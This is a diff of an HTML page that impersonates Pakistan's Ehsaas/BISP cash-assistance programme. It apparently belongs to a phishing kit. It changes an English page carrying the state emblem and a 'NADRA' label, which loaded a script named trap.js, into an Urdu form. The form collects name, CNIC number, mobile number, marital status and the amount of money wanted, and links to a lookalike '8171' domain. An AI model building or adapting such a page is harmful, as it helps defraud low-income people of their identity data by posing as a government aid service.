@@ -1,38 +1,35 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ur" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>Government Payment Portal – Ehsaas Kafalat</title>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto&display=swap">
+  <title>Ehsaas Program CNIC Check Online Registration - June 2025</title>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Nastaliq+Urdu&display=swap" rel="stylesheet">
+  <script src="/static/ehsaas.js"></script>
   <style>
     body {
-      background: linear-gradient(to bottom, #f9f9f9, #e4e4e4);
-      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(to bottom, #e0f7fa, #fff);
+      font-family: 'Noto Nastaliq Urdu', serif;
+      direction: rtl;
+      padding: 40px;
       text-align: center;
-      padding-top: 80px;
     }
-    .card {
-      width: 90%;
-      max-width: 400px;
+    .form-box {
+      background: #ffffff;
+      padding: 30px;
       margin: auto;
-      background: white;
-      box-shadow: 0 0 10px rgba(0,0,0,0.15);
-      padding: 25px;
-      border-radius: 12px;
+      max-width: 500px;
+      border-radius: 15px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.15);
     }
-    .card img {
-      width: 120px;
-      margin-bottom: 10px;
-    }
-    input {
+    input, select {
       width: 100%;
-      padding: 12px;
+      padding: 10px;
       margin: 10px 0;
+      border-radius: 5px;
       border: 1px solid #ccc;
-      border-radius: 6px;
     }
     button {
-      background-color: #006400;
+      background: #006400;
       color: white;
       border: none;
       padding: 12px 25px;
@@ -40,25 +37,41 @@
       border-radius: 6px;
       cursor: pointer;
     }
-    small {
-      display: block;
-      margin-top: 10px;
-      color: gray;
+    .link-box {
+      margin-top: 15px;
+      font-size: 14px;
     }
   </style>
-  <script src="/static/trap.js"></script>
 </head>
 <body>
-  <div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Emblem_of_Pakistan.svg/1200px-Emblem_of_Pakistan.svg.png" alt="Logo">
-    <h2>Ehsaas Emergency Cash</h2>
-    <p>Verify your CNIC to check your payment status.</p>
-    <form onsubmit="return false">
-      <input type="text" placeholder="Enter CNIC number" required>
-      <input type="text" placeholder="Mobile Number" required>
-      <button type="submit">Check Eligibility</button>
+  <div class="form-box">
+    <h2>اپنے گھرانے کی اہلیت کے بارے میں جانیۓ – Ehsaas Program BISP</h2>
+    <form id="ehsaasForm">
+      <input type="text" name="name" placeholder="نام" required>
+      <input type="text" name="cnic" placeholder="قومی شناختی کارڈ نمبر" required>
+      <input type="text" name="mobile" placeholder="موبائل نمبر" required>
+      <select name="amount">
+        <option value="">آپ کو کتنے پیسے کی ضرورت ہے؟</option>
+        <option>2000</option>
+        <option>8500</option>
+        <option>9000</option>
+        <option>12000</option>
+        <option>23000</option>
+        <option>25000</option>
+        <option>36000</option>
+      </select>
+      <select name="married">
+        <option value="">کیا آپ شادی شدہ ہیں؟</option>
+        <option>جی ہاں</option>
+        <option>نہیں</option>
+      </select>
+      <button type="submit">درخواست جمع کریں</button>
     </form>
-    <small>Govt. of Pakistan – Powered by NADRA</small>
+    <div class="link-box">
+      Ehsaas Program CNIC check online registration for 25000 now available.<br>
+      Or use official 8171 web portal:<br>
+      <a href="https://8171ehsaasprogramme.com.pk/#google_vignette" target="_blank">Apply کرنے کے لیے یہاں کلک کریں</a>
+    </div>
   </div>
 </body>
 </html>
